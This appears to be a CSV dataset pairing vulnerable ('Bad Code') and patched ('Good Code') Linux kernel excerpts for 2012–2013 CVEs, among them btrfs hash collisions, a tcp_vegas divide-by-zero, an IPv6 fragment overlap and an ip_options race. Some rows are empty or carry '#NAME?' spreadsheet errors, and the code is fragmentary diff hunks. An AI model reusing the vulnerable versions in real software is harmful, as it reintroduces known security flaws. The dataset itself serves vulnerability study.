Year,Type of vulnerability,CVE ID number,Bad Code,Good Code
2013,DoS ,CVE-2012-5374," struct btrfs_root *root);

/* dir-item.c */


int btrfs_insert_dir_item(struct btrfs_trans_handle *trans,
 struct btrfs_root *root, const char *name,
 int name_len, struct inode *dir,
 return btrfs_match_dir_item_name(root, path, name, name_len);
}




























































/*
 * lookup a directory item based on index.  'dir' is the objectid
 * we're searching in, and 'mod' tells us if you plan on deleting the
	ret = btrfs_insert_dir_item(trans, root, name, name_len,
				    parent_inode, &key,
 btrfs_inode_type(inode), index);
 if (ret == -EEXIST)
 goto fail_dir_item;
 else if (ret) {
 btrfs_abort_transaction(trans, root, ret);
 if (S_ISDIR(old_inode->i_mode) && new_inode &&
	    new_inode->i_size > BTRFS_EMPTY_DIR_SIZE)
 return -ENOTEMPTY;






















 /*
	 * we're using rename to replace one file with another.
	 * and the replacement file is large.  Start IO on it now so
 if (error)
 goto out_dput;











 down_read(&BTRFS_I(dir)->root->fs_info->subvol_sem);

 if (btrfs_root_refs(&BTRFS_I(dir)->root->root_item) == 0)
				    parent_inode, &key,
				    BTRFS_FT_DIR, index);
 /* We have check then name at the beginning, so it is impossible. */
 BUG_ON(ret == -EEXIST);
 if (ret) {
 btrfs_abort_transaction(trans, root, ret);
 goto fail;
"," struct btrfs_root *root);

/* dir-item.c */
int btrfs_check_dir_item_collision(struct btrfs_root *root, u64 dir,
 const char *name, int name_len);
int btrfs_insert_dir_item(struct btrfs_trans_handle *trans,
 struct btrfs_root *root, const char *name,
 int name_len, struct inode *dir,
 return btrfs_match_dir_item_name(root, path, name, name_len);
}

int btrfs_check_dir_item_collision(struct btrfs_root *root, u64 dir,
 const char *name, int name_len)
{
 int ret;
 struct btrfs_key key;
 struct btrfs_dir_item *di;
 int data_size;
 struct extent_buffer *leaf;
 int slot;
 struct btrfs_path *path;


	path = btrfs_alloc_path();
 if (!path)
 return -ENOMEM;

	key.objectid = dir;
 btrfs_set_key_type(&key, BTRFS_DIR_ITEM_KEY);
	key.offset = btrfs_name_hash(name, name_len);

	ret = btrfs_search_slot(NULL, root, &key, path, 0, 0);

 /* return back any errors */
 if (ret < 0)
 goto out;

 /* nothing found, we're safe */
 if (ret > 0) {
		ret = 0;
 goto out;
	}

 /* we found an item, look for our name in the item */
	di = btrfs_match_dir_item_name(root, path, name, name_len);
 if (di) {
 /* our exact name was found */
		ret = -EEXIST;
 goto out;
	}

 /*
	 * see if there is room in the item to insert this
	 * name
 */
	data_size = sizeof(*di) + name_len + sizeof(struct btrfs_item);
	leaf = path->nodes[0];
	slot = path->slots[0];
 if (data_size + btrfs_item_size_nr(leaf, slot) +
 sizeof(struct btrfs_item) > BTRFS_LEAF_DATA_SIZE(root)) {
		ret = -EOVERFLOW;
	} else {
 /* plenty of insertion room */
		ret = 0;
	}
out:
 btrfs_free_path(path);
 return ret;
}

/*
 * lookup a directory item based on index.  'dir' is the objectid
 * we're searching in, and 'mod' tells us if you plan on deleting the
	ret = btrfs_insert_dir_item(trans, root, name, name_len,
				    parent_inode, &key,
 btrfs_inode_type(inode), index);
 if (ret == -EEXIST || ret == -EOVERFLOW)
 goto fail_dir_item;
 else if (ret) {
 btrfs_abort_transaction(trans, root, ret);
 if (S_ISDIR(old_inode->i_mode) && new_inode &&
	    new_inode->i_size > BTRFS_EMPTY_DIR_SIZE)
 return -ENOTEMPTY;


 /* check for collisions, even if the  name isn't there */
	ret = btrfs_check_dir_item_collision(root, new_dir->i_ino,
			     new_dentry->d_name.name,
			     new_dentry->d_name.len);

 if (ret) {
 if (ret == -EEXIST) {
 /* we shouldn't get
			 * eexist without a new_inode */
 if (!new_inode) {
 WARN_ON(1);
 return ret;
			}
		} else {
 /* maybe -EOVERFLOW */
 return ret;
		}
	}
	ret = 0;

 /*
	 * we're using rename to replace one file with another.
	 * and the replacement file is large.  Start IO on it now so
 if (error)
 goto out_dput;

 /*
	 * even if this name doesn't exist, we may get hash collisions.
	 * check for them now when we can safely fail
 */
	error = btrfs_check_dir_item_collision(BTRFS_I(dir)->root,
					       dir->i_ino, name,
					       namelen);
 if (error)
 goto out_dput;

 down_read(&BTRFS_I(dir)->root->fs_info->subvol_sem);

 if (btrfs_root_refs(&BTRFS_I(dir)->root->root_item) == 0)
				    parent_inode, &key,
				    BTRFS_FT_DIR, index);
 /* We have check then name at the beginning, so it is impossible. */
 BUG_ON(ret == -EEXIST || ret == -EOVERFLOW);
 if (ret) {
 btrfs_abort_transaction(trans, root, ret);
 goto fail;
"
2012,DoS ,CVE-2012-4565,"			.tcpv_rttcnt = ca->cnt_rtt,
			.tcpv_minrtt = ca->base_rtt,
		};
		u64 t = ca->sum_rtt;

 do_div(t, ca->cnt_rtt);
 info.tcpv_rtt = t;




 nla_put(skb, INET_DIAG_VEGASINFO, sizeof(info), &info);
	}
}
","			.tcpv_rttcnt = ca->cnt_rtt,
			.tcpv_minrtt = ca->base_rtt,
		};


 if (info.tcpv_rttcnt > 0) {
 	u64 t = ca->sum_rtt;

 do_div(t, info.tcpv_rttcnt);
			info.tcpv_rtt = t;
		}
 nla_put(skb, INET_DIAG_VEGASINFO, sizeof(info), &info);
	}
}
"
2013,Bypass ,CVE-2012-4542,,
2013,#NAME?,CVE-2012-4530," goto _error;
	bprm->argc ++;

	bprm->interp = iname;	/* for binfmt_script */




	interp_file = open_exec (iname);
	retval = PTR_ERR (interp_file);
	retval = copy_strings_kernel(1, &i_name, bprm);
 if (retval) return retval; 
	bprm->argc++;
	bprm->interp = interp;



 /*
	 * OK, now restart the process with the interpreter's dentry.
 mutex_unlock(&current->signal->cred_guard_mutex);
 abort_creds(bprm->cred);
	}



 kfree(bprm);
}













/*
 * install the new credentials for this executable
 */
 unsigned long stack_top,
 int executable_stack);
extern int bprm_mm_init(struct linux_binprm *bprm);

extern int copy_strings_kernel(int argc, const char *const *argv,
 struct linux_binprm *bprm);
extern int prepare_bprm_creds(struct linux_binprm *bprm);
"," goto _error;
	bprm->argc ++;

 /* Update interp in case binfmt_script needs it. */
	retval = bprm_change_interp(iname, bprm);
 if (retval < 0)
 goto _error;

	interp_file = open_exec (iname);
	retval = PTR_ERR (interp_file);
	retval = copy_strings_kernel(1, &i_name, bprm);
 if (retval) return retval; 
	bprm->argc++;
	retval = bprm_change_interp(interp, bprm);
 if (retval < 0)
 return retval;

 /*
	 * OK, now restart the process with the interpreter's dentry.
 mutex_unlock(&current->signal->cred_guard_mutex);
 abort_creds(bprm->cred);
	}
 /* If a binfmt changed the interp, free it. */
 if (bprm->interp != bprm->filename)
 kfree(bprm->interp);
 kfree(bprm);
}

int bprm_change_interp(char *interp, struct linux_binprm *bprm)
{
 /* If a binfmt changed the interp, free it first. */
 if (bprm->interp != bprm->filename)
 kfree(bprm->interp);
	bprm->interp = kstrdup(interp, GFP_KERNEL);
 if (!bprm->interp)
 return -ENOMEM;
 return 0;
}
EXPORT_SYMBOL(bprm_change_interp);

/*
 * install the new credentials for this executable
 */
 unsigned long stack_top,
 int executable_stack);
extern int bprm_mm_init(struct linux_binprm *bprm);
extern int bprm_change_interp(char *interp, struct linux_binprm *bprm);
extern int copy_strings_kernel(int argc, const char *const *argv,
 struct linux_binprm *bprm);
extern int prepare_bprm_creds(struct linux_binprm *bprm);
"
2012,#NAME?,CVE-2012-4508,"#define EXT4_EXT_MARK_UNINIT1 0x2 /* mark first half uninitialized */
#define EXT4_EXT_MARK_UNINIT2 0x4 /* mark second half uninitialized */




static __le32 ext4_extent_block_csum(struct inode *inode,
 struct ext4_extent_header *eh)
{
 unsigned int ee_len, depth;
 int err = 0;




 ext_debug(""ext4_split_extents_at: inode %lu, logical""
 ""block %llu\n"", inode->i_ino, (unsigned long long)split);


	err = ext4_ext_insert_extent(handle, inode, path, &newex, flags);
 if (err == -ENOSPC && (EXT4_EXT_MAY_ZEROOUT & split_flag)) {
		err = ext4_ext_zeroout(inode, &orig_ex);







 if (err)
 goto fix_extent_len;
 /* update the extent length and mark as initialized */
	uninitialized = ext4_ext_is_uninitialized(ex);

 if (map->m_lblk + map->m_len < ee_block + ee_len) {
		split_flag1 = split_flag & EXT4_EXT_MAY_ZEROOUT ?
			      EXT4_EXT_MAY_ZEROOUT : 0;
		flags1 = flags | EXT4_GET_BLOCKS_PRE_IO;
 if (uninitialized)
			split_flag1 |= EXT4_EXT_MARK_UNINIT1 |
				       EXT4_EXT_MARK_UNINIT2;


		err = ext4_split_extent_at(handle, inode, path,
				map->m_lblk + map->m_len, split_flag1, flags1);
 if (err)
 return PTR_ERR(path);

 if (map->m_lblk >= ee_block) {
		split_flag1 = split_flag & EXT4_EXT_MAY_ZEROOUT ?
   EXT4_EXT_MAY_ZEROOUT : 0;
 if (uninitialized)
			split_flag1 |= EXT4_EXT_MARK_UNINIT1;
 if (split_flag & EXT4_EXT_MARK_UNINIT2)

	split_flag |= ee_block + ee_len <= eof_block ? EXT4_EXT_MAY_ZEROOUT : 0;
	split_flag |= EXT4_EXT_MARK_UNINIT2;


	flags |= EXT4_GET_BLOCKS_PRE_IO;
 return ext4_split_extent(handle, inode, path, map, split_flag, flags);
}

static int ext4_convert_unwritten_extents_endio(handle_t *handle,
 struct inode *inode,
 struct ext4_ext_path *path)

{
 struct ext4_extent *ex;


 int depth;
 int err = 0;

	depth = ext_depth(inode);
	ex = path[depth].p_ext;



 ext_debug(""ext4_convert_unwritten_extents_endio: inode %lu, logical""
 ""block %llu, max_blocks %u\n"", inode->i_ino,
		(unsigned long long)le32_to_cpu(ex->ee_block),
 ext4_ext_get_actual_len(ex));
















	err = ext4_ext_get_access(handle, inode, path + depth);
 if (err)
	}
 /* IO end_io complete, convert the filled extent to written */
 if ((flags & EXT4_GET_BLOCKS_CONVERT)) {
		ret = ext4_convert_unwritten_extents_endio(handle, inode,
							path);
 if (ret >= 0) {
 ext4_update_inode_fsync_trans(handle, inode, 1);
","#define EXT4_EXT_MARK_UNINIT1 0x2 /* mark first half uninitialized */
#define EXT4_EXT_MARK_UNINIT2 0x4 /* mark second half uninitialized */

#define EXT4_EXT_DATA_VALID1 0x8 /* first half contains valid data */
#define EXT4_EXT_DATA_VALID2 0x10 /* second half contains valid data */

static __le32 ext4_extent_block_csum(struct inode *inode,
 struct ext4_extent_header *eh)
{
 unsigned int ee_len, depth;
 int err = 0;

 BUG_ON((split_flag & (EXT4_EXT_DATA_VALID1 | EXT4_EXT_DATA_VALID2)) ==
	       (EXT4_EXT_DATA_VALID1 | EXT4_EXT_DATA_VALID2));

 ext_debug(""ext4_split_extents_at: inode %lu, logical""
 ""block %llu\n"", inode->i_ino, (unsigned long long)split);


	err = ext4_ext_insert_extent(handle, inode, path, &newex, flags);
 if (err == -ENOSPC && (EXT4_EXT_MAY_ZEROOUT & split_flag)) {
 if (split_flag & (EXT4_EXT_DATA_VALID1|EXT4_EXT_DATA_VALID2)) {
 if (split_flag & EXT4_EXT_DATA_VALID1)
				err = ext4_ext_zeroout(inode, ex2);
 else
				err = ext4_ext_zeroout(inode, ex);
		} else
			err = ext4_ext_zeroout(inode, &orig_ex);

 if (err)
 goto fix_extent_len;
 /* update the extent length and mark as initialized */
	uninitialized = ext4_ext_is_uninitialized(ex);

 if (map->m_lblk + map->m_len < ee_block + ee_len) {
		split_flag1 = split_flag & EXT4_EXT_MAY_ZEROOUT;

		flags1 = flags | EXT4_GET_BLOCKS_PRE_IO;
 if (uninitialized)
			split_flag1 |= EXT4_EXT_MARK_UNINIT1 |
				       EXT4_EXT_MARK_UNINIT2;
 if (split_flag & EXT4_EXT_DATA_VALID2)
			split_flag1 |= EXT4_EXT_DATA_VALID1;
		err = ext4_split_extent_at(handle, inode, path,
				map->m_lblk + map->m_len, split_flag1, flags1);
 if (err)
 return PTR_ERR(path);

 if (map->m_lblk >= ee_block) {
		split_flag1 = split_flag & (EXT4_EXT_MAY_ZEROOUT |
   EXT4_EXT_DATA_VALID2);
 if (uninitialized)
			split_flag1 |= EXT4_EXT_MARK_UNINIT1;
 if (split_flag & EXT4_EXT_MARK_UNINIT2)

	split_flag |= ee_block + ee_len <= eof_block ? EXT4_EXT_MAY_ZEROOUT : 0;
	split_flag |= EXT4_EXT_MARK_UNINIT2;
 if (flags & EXT4_GET_BLOCKS_CONVERT)
		split_flag |= EXT4_EXT_DATA_VALID2;
	flags |= EXT4_GET_BLOCKS_PRE_IO;
 return ext4_split_extent(handle, inode, path, map, split_flag, flags);
}

static int ext4_convert_unwritten_extents_endio(handle_t *handle,
 struct inode *inode,
 struct ext4_map_blocks *map,
 struct ext4_ext_path *path)
{
 struct ext4_extent *ex;
 ext4_lblk_t ee_block;
 unsigned int ee_len;
 int depth;
 int err = 0;

	depth = ext_depth(inode);
	ex = path[depth].p_ext;
	ee_block = le32_to_cpu(ex->ee_block);
	ee_len = ext4_ext_get_actual_len(ex);

 ext_debug(""ext4_convert_unwritten_extents_endio: inode %lu, logical""
 ""block %llu, max_blocks %u\n"", inode->i_ino,
		  (unsigned long long)ee_block, ee_len);

 /* If extent is larger than requested then split is required */
 if (ee_block != map->m_lblk || ee_len > map->m_len) {
		err = ext4_split_unwritten_extents(handle, inode, map, path,
						   EXT4_GET_BLOCKS_CONVERT);
 if (err < 0)
 goto out;
 ext4_ext_drop_refs(path);
		path = ext4_ext_find_extent(inode, map->m_lblk, path);
 if (IS_ERR(path)) {
			err = PTR_ERR(path);
 goto out;
		}
		depth = ext_depth(inode);
		ex = path[depth].p_ext;
	}

	err = ext4_ext_get_access(handle, inode, path + depth);
 if (err)
	}
 /* IO end_io complete, convert the filled extent to written */
 if ((flags & EXT4_GET_BLOCKS_CONVERT)) {
		ret = ext4_convert_unwritten_extents_endio(handle, inode, map,
							path);
 if (ret >= 0) {
 ext4_update_inode_fsync_trans(handle, inode, 1);
"
2012,DoS +Info ,CVE-2012-4467,"	err = sock_do_ioctl(net, sock, cmd, (unsigned long)&ktv);
 set_fs(old_fs);
 if (!err)
		err = compat_put_timeval(up, &ktv);

 return err;
}
	err = sock_do_ioctl(net, sock, cmd, (unsigned long)&kts);
 set_fs(old_fs);
 if (!err)
		err = compat_put_timespec(up, &kts);

 return err;
}
","	err = sock_do_ioctl(net, sock, cmd, (unsigned long)&ktv);
 set_fs(old_fs);
 if (!err)
		err = compat_put_timeval(&ktv, up);

 return err;
}
	err = sock_do_ioctl(net, sock, cmd, (unsigned long)&kts);
 set_fs(old_fs);
 if (!err)
		err = compat_put_timespec(&kts, up);

 return err;
}
"
2013,DoS ,CVE-2012-4461,,
2012,Bypass ,CVE-2012-4444,"}
EXPORT_SYMBOL(ip6_frag_match);

/* Memory Tracking Functions. */
static void frag_kfree_skb(struct netns_frags *nf, struct sk_buff *skb)
{
 atomic_sub(skb->truesize, &nf->mem);
 kfree_skb(skb);
}

void ip6_frag_init(struct inet_frag_queue *q, void *a)
{
 struct frag_queue *fq = container_of(q, struct frag_queue, q);
	}

found:
 /* We found where to put this one.  Check for overlap with
	 * preceding fragment, and, if needed, align things so that
	 * any overlaps are eliminated.



 */
 if (prev) {
 int i = (FRAG6_CB(prev)->offset + prev->len) - offset;

 if (i > 0) {
			offset += i;
 if (end <= offset)
 goto err;
 if (!pskb_pull(skb, i))
 goto err;
 if (skb->ip_summed != CHECKSUM_UNNECESSARY)
				skb->ip_summed = CHECKSUM_NONE;
		}
	}

 /* Look for overlap with succeeding segments.
	 * If we can merge fragments, do it.
 */
 while (next && FRAG6_CB(next)->offset < end) {
 int i = end - FRAG6_CB(next)->offset; /* overlap is 'i' bytes */

 if (i < next->len) {
 /* Eat head of the next overlapped fragment
			 * and leave the loop. The next ones cannot overlap.
 */
 if (!pskb_pull(next, i))
 goto err;
 FRAG6_CB(next)->offset += i;	/* next fragment */
			fq->q.meat -= i;
 if (next->ip_summed != CHECKSUM_UNNECESSARY)
				next->ip_summed = CHECKSUM_NONE;
 break;
		} else {
 struct sk_buff *free_it = next;

 /* Old fragment is completely overridden with
			 * new one drop it.
 */
			next = next->next;

 if (prev)
				prev->next = next;
 else
				fq->q.fragments = next;

			fq->q.meat -= free_it->len;
 frag_kfree_skb(fq->q.net, free_it);
		}
	}

 FRAG6_CB(skb)->offset = offset;

 write_unlock(&ip6_frags.lock);
 return -1;



err:
 IP6_INC_STATS(net, ip6_dst_idev(skb_dst(skb)),
		      IPSTATS_MIB_REASMFAILS);
","}
EXPORT_SYMBOL(ip6_frag_match);








void ip6_frag_init(struct inet_frag_queue *q, void *a)
{
 struct frag_queue *fq = container_of(q, struct frag_queue, q);
	}

found:
 /* RFC5722, Section 4:
	 *                                  When reassembling an IPv6 datagram, if
	 *   one or more its constituent fragments is determined to be an
	 *   overlapping fragment, the entire datagram (and any constituent
	 *   fragments, including those not yet received) MUST be silently
	 *   discarded.
 */



 /* Check for overlap with preceding fragment. */
 if (prev &&
	    (FRAG6_CB(prev)->offset + prev->len) - offset > 0)
 goto discard_fq;







 /* Look for overlap with succeeding segment. */
 if (next && FRAG6_CB(next)->offset < end)
 goto discard_fq;
































 FRAG6_CB(skb)->offset = offset;

 write_unlock(&ip6_frags.lock);
 return -1;

discard_fq:
 fq_kill(fq);
err:
 IP6_INC_STATS(net, ip6_dst_idev(skb_dst(skb)),
		      IPSTATS_MIB_REASMFAILS);
"
2013,DoS ,CVE-2012-4398,,
2012,DoS ,CVE-2012-3552," unsigned char	__data[0];
};

#define optlength(opt) (sizeof(struct ip_options) + opt->optlen)









struct inet_request_sock {
 struct request_sock	req;
				acked	   : 1,
				no_srccheck: 1;
 kmemcheck_bitfield_end(flags);
 struct ip_options	*opt;
};

static inline struct inet_request_sock *inet_rsk(const struct request_sock *sk)
	__be16			inet_sport;
	__u16			inet_id;

 struct ip_options	*opt;
	__u8			tos;
	__u8			min_ttl;
	__u8			mc_ttl;
struct ipcm_cookie {
	__be32			addr;
 int			oif;
 struct ip_options	*opt;
	__u8			tx_flags;
};


extern int ip_build_and_send_pkt(struct sk_buff *skb, struct sock *sk,
					      __be32 saddr, __be32 daddr,
 struct ip_options *opt);
extern int ip_rcv(struct sk_buff *skb, struct net_device *dev,
 struct packet_type *pt, struct net_device *orig_dev);
extern int ip_local_deliver(struct sk_buff *skb);
 *	Functions provided by ip_options.c
 */

extern void ip_options_build(struct sk_buff *skb, struct ip_options *opt, __be32 daddr, struct rtable *rt, int is_frag);

extern int ip_options_echo(struct ip_options *dopt, struct sk_buff *skb);
extern void ip_options_fragment(struct sk_buff *skb);
extern int ip_options_compile(struct net *net,
 struct ip_options *opt, struct sk_buff *skb);
extern int ip_options_get(struct net *net, struct ip_options **optp,
 unsigned char *data, int optlen);
extern int ip_options_get_from_user(struct net *net, struct ip_options **optp,
 unsigned char __user *data, int optlen);
extern void ip_options_undo(struct ip_options * opt);
extern void ip_forward_options(struct sk_buff *skb);
 struct flowi4 fl4;
 struct rtable *rt;
 int err;


	dp->dccps_role = DCCP_ROLE_CLIENT;

 return -EAFNOSUPPORT;

	nexthop = daddr = usin->sin_addr.s_addr;
 if (inet->opt != NULL && inet->opt->srr) {



 if (daddr == 0)
 return -EINVAL;
		nexthop = inet->opt->faddr;
	}

	orig_sport = inet->inet_sport;
 return -ENETUNREACH;
	}

 if (inet->opt == NULL || !inet->opt->srr)
		daddr = rt->rt_dst;

 if (inet->inet_saddr == 0)
	inet->inet_daddr = daddr;

 inet_csk(sk)->icsk_ext_hdr_len = 0;
 if (inet->opt != NULL)
 inet_csk(sk)->icsk_ext_hdr_len = inet->opt->optlen;
 /*
	 * Socket identity is still unknown (sport may be zero).
	 * However we set state to DCCP_REQUESTING and not releasing socket
	newinet->inet_daddr	= ireq->rmt_addr;
	newinet->inet_rcv_saddr = ireq->loc_addr;
	newinet->inet_saddr	= ireq->loc_addr;
	newinet->opt = ireq->opt;
	ireq->opt	   = NULL;
	newinet->mc_index  = inet_iif(skb);
	newinet->mc_ttl	   = ip_hdr(skb)->ttl;

	   First: no IPv4 options.
 */
	newinet->opt = NULL;

 /* Clone RX bits */
	newnp->rxopt.all = np->rxopt.all;
 WARN_ON(sk->sk_wmem_queued);
 WARN_ON(sk->sk_forward_alloc);

 kfree(inet->opt);
 dst_release(rcu_dereference_check(sk->sk_dst_cache, 1));
 sk_refcnt_debug_dec(sk);
}
 struct flowi4 fl4;
 struct rtable *rt;
	__be32 new_saddr;


 if (inet->opt && inet->opt->srr)
		daddr = inet->opt->faddr;



 /* Query new route. */
	rt = ip_route_connect(&fl4, daddr, 0, RT_CONN_FLAGS(sk),
 struct inet_sock *inet = inet_sk(sk);
 struct rtable *rt = (struct rtable *)__sk_dst_check(sk, 0);
	__be32 daddr;

 int err;

 /* Route is OK, nothing to do. */
 if (rt)
 return 0;

 /* Reroute. */


	daddr = inet->inet_daddr;
 if (inet->opt && inet->opt->srr)
		daddr = inet->opt->faddr;

	rt = ip_route_output_ports(sock_net(sk), sk, daddr, inet->inet_saddr,
				   inet->inet_dport, inet->inet_sport,
				   sk->sk_protocol, RT_CONN_FLAGS(sk),
"," unsigned char	__data[0];
};

struct ip_options_rcu {
 struct rcu_head rcu;
 struct ip_options opt;
};

struct ip_options_data {
 struct ip_options_rcu	opt;
 char			data[40];
};

struct inet_request_sock {
 struct request_sock	req;
				acked	   : 1,
				no_srccheck: 1;
 kmemcheck_bitfield_end(flags);
 struct ip_options_rcu	*opt;
};

static inline struct inet_request_sock *inet_rsk(const struct request_sock *sk)
	__be16			inet_sport;
	__u16			inet_id;

 struct ip_options_rcu __rcu	*inet_opt;
	__u8			tos;
	__u8			min_ttl;
	__u8			mc_ttl;
struct ipcm_cookie {
	__be32			addr;
 int			oif;
 struct ip_options_rcu	*opt;
	__u8			tx_flags;
};


extern int ip_build_and_send_pkt(struct sk_buff *skb, struct sock *sk,
					      __be32 saddr, __be32 daddr,
 struct ip_options_rcu *opt);
extern int ip_rcv(struct sk_buff *skb, struct net_device *dev,
 struct packet_type *pt, struct net_device *orig_dev);
extern int ip_local_deliver(struct sk_buff *skb);
 *	Functions provided by ip_options.c
 */

extern void ip_options_build(struct sk_buff *skb, struct ip_options *opt,
			     __be32 daddr, struct rtable *rt, int is_frag);
extern int ip_options_echo(struct ip_options *dopt, struct sk_buff *skb);
extern void ip_options_fragment(struct sk_buff *skb);
extern int ip_options_compile(struct net *net,
 struct ip_options *opt, struct sk_buff *skb);
extern int ip_options_get(struct net *net, struct ip_options_rcu **optp,
 unsigned char *data, int optlen);
extern int ip_options_get_from_user(struct net *net, struct ip_options_rcu **optp,
 unsigned char __user *data, int optlen);
extern void ip_options_undo(struct ip_options * opt);
extern void ip_forward_options(struct sk_buff *skb);
 struct flowi4 fl4;
 struct rtable *rt;
 int err;
 struct ip_options_rcu *inet_opt;

	dp->dccps_role = DCCP_ROLE_CLIENT;

 return -EAFNOSUPPORT;

	nexthop = daddr = usin->sin_addr.s_addr;

	inet_opt = rcu_dereference_protected(inet->inet_opt,
 sock_owned_by_user(sk));
 if (inet_opt != NULL && inet_opt->opt.srr) {
 if (daddr == 0)
 return -EINVAL;
		nexthop = inet_opt->opt.faddr;
	}

	orig_sport = inet->inet_sport;
 return -ENETUNREACH;
	}

 if (inet_opt == NULL || !inet_opt->opt.srr)
		daddr = rt->rt_dst;

 if (inet->inet_saddr == 0)
	inet->inet_daddr = daddr;

 inet_csk(sk)->icsk_ext_hdr_len = 0;
 if (inet_opt)
 inet_csk(sk)->icsk_ext_hdr_len = inet_opt->opt.optlen;
 /*
	 * Socket identity is still unknown (sport may be zero).
	 * However we set state to DCCP_REQUESTING and not releasing socket
	newinet->inet_daddr	= ireq->rmt_addr;
	newinet->inet_rcv_saddr = ireq->loc_addr;
	newinet->inet_saddr	= ireq->loc_addr;
	newinet->inet_opt = ireq->opt;
	ireq->opt	   = NULL;
	newinet->mc_index  = inet_iif(skb);
	newinet->mc_ttl	   = ip_hdr(skb)->ttl;

	   First: no IPv4 options.
 */
	newinet->inet_opt = NULL;

 /* Clone RX bits */
	newnp->rxopt.all = np->rxopt.all;
 WARN_ON(sk->sk_wmem_queued);
 WARN_ON(sk->sk_forward_alloc);

 kfree(rcu_dereference_protected(inet->inet_opt, 1));
 dst_release(rcu_dereference_check(sk->sk_dst_cache, 1));
 sk_refcnt_debug_dec(sk);
}
 struct flowi4 fl4;
 struct rtable *rt;
	__be32 new_saddr;
 struct ip_options_rcu *inet_opt;

	inet_opt = rcu_dereference_protected(inet->inet_opt,
 sock_owned_by_user(sk));
 if (inet_opt && inet_opt->opt.srr)
		daddr = inet_opt->opt.faddr;

 /* Query new route. */
	rt = ip_route_connect(&fl4, daddr, 0, RT_CONN_FLAGS(sk),
 struct inet_sock *inet = inet_sk(sk);
 struct rtable *rt = (struct rtable *)__sk_dst_check(sk, 0);
	__be32 daddr;
 struct ip_options_rcu *inet_opt;
 int err;

 /* Route is OK, nothing to do. */
 if (rt)
 return 0;

 /* Reroute. */
 rcu_read_lock();
	inet_opt = rcu_dereference(inet->inet_opt);
	daddr = inet->inet_daddr;
 if (inet_opt && inet_opt->opt.srr)
		daddr = inet_opt->opt.faddr;
 rcu_read_unlock();
	rt = ip_route_output_ports(sock_net(sk), sk, daddr, inet->inet_saddr,
				   inet->inet_dport, inet->inet_sport,
				   sk->sk_protocol, RT_CONN_FLAGS(sk),
"
2012,,CVE-2012-3520,"}

static __inline__ int scm_send(struct socket *sock, struct msghdr *msg,
 struct scm_cookie *scm)
{
 memset(scm, 0, sizeof(*scm));


 unix_get_peersec_dgram(sock, scm);
 if (msg->msg_controllen <= 0)
 return 0;
 if (NULL == siocb->scm)
		siocb->scm = &scm;

	err = scm_send(sock, msg, siocb->scm);
 if (err < 0)
 return err;

 if (NULL == siocb->scm)
		siocb->scm = &tmp_scm;
 wait_for_unix_gc();
	err = scm_send(sock, msg, siocb->scm);
 if (err < 0)
 return err;

 if (NULL == siocb->scm)
		siocb->scm = &tmp_scm;
 wait_for_unix_gc();
	err = scm_send(sock, msg, siocb->scm);
 if (err < 0)
 return err;

","}

static __inline__ int scm_send(struct socket *sock, struct msghdr *msg,
 struct scm_cookie *scm, bool forcecreds)
{
 memset(scm, 0, sizeof(*scm));
 if (forcecreds)
 scm_set_cred(scm, task_tgid(current), current_cred());
 unix_get_peersec_dgram(sock, scm);
 if (msg->msg_controllen <= 0)
 return 0;
 if (NULL == siocb->scm)
		siocb->scm = &scm;

	err = scm_send(sock, msg, siocb->scm, true);
 if (err < 0)
 return err;

 if (NULL == siocb->scm)
		siocb->scm = &tmp_scm;
 wait_for_unix_gc();
	err = scm_send(sock, msg, siocb->scm, false);
 if (err < 0)
 return err;

 if (NULL == siocb->scm)
		siocb->scm = &tmp_scm;
 wait_for_unix_gc();
	err = scm_send(sock, msg, siocb->scm, false);
 if (err < 0)
 return err;

"
